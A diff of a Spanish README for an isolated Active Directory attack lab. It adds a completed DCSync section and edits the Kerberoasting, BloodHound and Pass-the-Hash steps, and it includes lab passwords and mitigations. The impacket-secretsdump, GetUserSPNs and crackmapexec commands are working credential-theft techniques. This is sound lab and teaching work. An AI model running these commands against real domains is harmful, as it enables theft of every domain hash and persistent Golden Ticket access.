@@ -59,7 +59,7 @@ Montado íntegramente en local con VMware Workstation — entorno 100% aislado, 
 | jsmith | Password1 | Usuario estándar | Contraseña débil |
 | mjohnson | Summer2023! | Usuario estándar | Contraseña débil |
 | svc-sql | MYpassword123# | Service Account | **Kerberoastable** (SPN registrado) |
-| localadmin | P@ssw0rd123! | Domain Admin | **Pass-the-Hash** |
+| localadmin | P@ssw0rd123! | Domain Admin | **Pass-the-Hash** / **DCSync** |
 | asrepuser | Welcome1! | Usuario estándar | **AS-REP Roastable** (pre-auth desactivada) |
  
 ---
@@ -126,7 +126,7 @@ New-ADUser -Name "SQL Service" -SamAccountName "svc-sql" -UserPrincipalName "svc
 setspn -A MSSQLSvc/WIN-DC01.lab.local:1433 LAB\svc-sql
 setspn -A MSSQLSvc/WIN-DC01:1433 LAB\svc-sql
  
-# Admin de dominio — vulnerable a Pass-the-Hash
+# Admin de dominio — vulnerable a Pass-the-Hash y DCSync
 New-ADUser -Name "Local Admin" -SamAccountName "localadmin" -UserPrincipalName "localadmin@lab.local" `
   -Path "OU=Lab Users,DC=lab,DC=local" `
   -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
@@ -277,7 +277,7 @@ nslookup lab.local 192.168.100.10
 | Kerberoasting | Impacket GetUserSPNs + John the Ripper | ✅ Completado |
 | Pass-the-Hash | Impacket secretsdump + CrackMapExec | ✅ Completado |
 | AS-REP Roasting | Impacket GetNPUsers + John the Ripper | ✅ Completado |
-| DCSync | Impacket secretsdump | 🔄 En progreso |
+| DCSync | Impacket secretsdump | ✅ Completado |
  
 ---
  
@@ -290,7 +290,7 @@ BloodHound mapea todas las relaciones del dominio — usuarios, grupos, permisos
 ### Ejecución
  
 ```bash
-# Recopilar datos del dominio — cualquier usuario válido sirve
+# Recopilar datos del dominio
 bloodhound-python \
   -u jsmith \
   -p 'Password1' \
@@ -299,14 +299,11 @@ bloodhound-python \
   -c all \
   --zip
  
-# Arrancar BloodHound CE
+# Arrancar BloodHound CE e importar el .zip desde http://127.0.0.1:8080
 bloodhound --no-sandbox
- 
-# Importar el .zip generado desde la interfaz web
-# http://127.0.0.1:8080
 ```
  
-### Query — encontrar cuentas Kerberoastables
+### Query — cuentas Kerberoastables
  
 ```cypher
 MATCH (u:User {hasspn:true}) RETURN u
@@ -336,8 +333,8 @@ KRBTGT@LAB.LOCAL   → Kerberoastable
 ### Mitigación
  
 - Principio de mínimo privilegio — revisar ACLs del dominio regularmente
-- Limitar qué usuarios pueden hacer consultas LDAP masivas
-- Monitorizar consultas LDAP anómalas con un SIEM
+- Limitar consultas LDAP masivas
+- Monitorizar actividad LDAP anómala con un SIEM
  
 ---
  
@@ -350,13 +347,13 @@ Kerberoasting explota el protocolo Kerberos para obtener tickets de servicio (TG
 ### Ejecución
  
 ```bash
-# Paso 1 — Solicitar tickets TGS de cuentas con SPN
+# Solicitar tickets TGS de cuentas con SPN
 impacket-GetUserSPNs lab.local/jsmith:'Password1' \
   -dc-ip 192.168.100.10 \
   -request \
   -outputfile kerberoast.hash
  
-# Paso 2 — Crackear el hash offline
+# Crackear el hash offline
 john --format=krb5tgs \
   --wordlist=/usr/share/wordlists/rockyou.txt \
   kerberoast.hash
@@ -395,13 +392,10 @@ Pass-the-Hash aprovecha que Windows autentica usuarios mediante su hash NTLM. Si
 ### Ejecución
  
 ```bash
-# Paso 1 — Extraer hashes NTLM del DC
+# Extraer hashes NTLM del DC
 impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10
  
-# Hash NTLM de localadmin:
-# localadmin:1106:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
- 
-# Paso 2 — Autenticarse con el hash sin contraseña
+# Autenticarse con el hash sin contraseña
 crackmapexec smb 192.168.100.0/24 \
   -u localadmin \
   -H 7dfa0531d73101ca080c7379a9bff1c7
@@ -489,7 +483,52 @@ asrepuser : Welcome1!
  
 ## 💀 DCSync
  
-> 🔄 *En progreso*
+### ¿Qué es?
+ 
+DCSync simula ser un Domain Controller y le pide al DC real que replique las credenciales de todos los usuarios del dominio. Permite obtener el hash de `Administrator` y el hash de `krbtgt` — este último permite crear **Golden Tickets**, que dan acceso ilimitado al dominio de forma persistente.
+ 
+### Ejecución
+ 
+```bash
+# DCSync completo — extrae todos los hashes del dominio
+impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10 \
+  -just-dc
+ 
+# DCSync dirigido — hash de Administrator
+impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10 \
+  -just-dc-user Administrator
+ 
+# DCSync dirigido — hash de krbtgt (Golden Ticket)
+impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10 \
+  -just-dc-user krbtgt
+```
+ 
+### Resultado
+ 
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
+```
+ 
+**Verificación:**
+ 
+![DCSync todos los hashes](./docs/screenshots/fase6-01-dcsync-all.png)
+
+*Replicación completa del dominio — todos los hashes extraídos*
+ 
+![DCSync Administrator](./docs/screenshots/fase6-02-dcsync-administrator.png)
+
+*Hash NTLM de Administrator obtenido via DCSync*
+ 
+![DCSync krbtgt](./docs/screenshots/fase6-03-dcsync-krbtgt.png)
+
+*Hash de krbtgt obtenido — base para Golden Ticket*
+ 
+### Mitigación
+ 
+- Restringir permisos de replicación de directorio — solo los DCs reales deben tenerlos
+- Monitorizar eventos **4662** en el log de seguridad del DC
+- Auditar regularmente: `Get-ADUser -Filter * -Properties "msDS-AllowedToDelegateTo"`
  
 ---
  
@@ -501,7 +540,7 @@ asrepuser : Welcome1!
 | Kerberoasting | Contraseñas +25 caracteres · Usar gMSA |
 | Pass-the-Hash | Deshabilitar NTLM · Credential Guard · Protected Users |
 | AS-REP Roasting | Forzar pre-autenticación Kerberos · Auditar cuentas periódicamente |
-| DCSync | Restringir permisos de replicación (solo DCs reales) |
+| DCSync | Restringir permisos de replicación · Monitorizar evento 4662 |
  
 ---
  
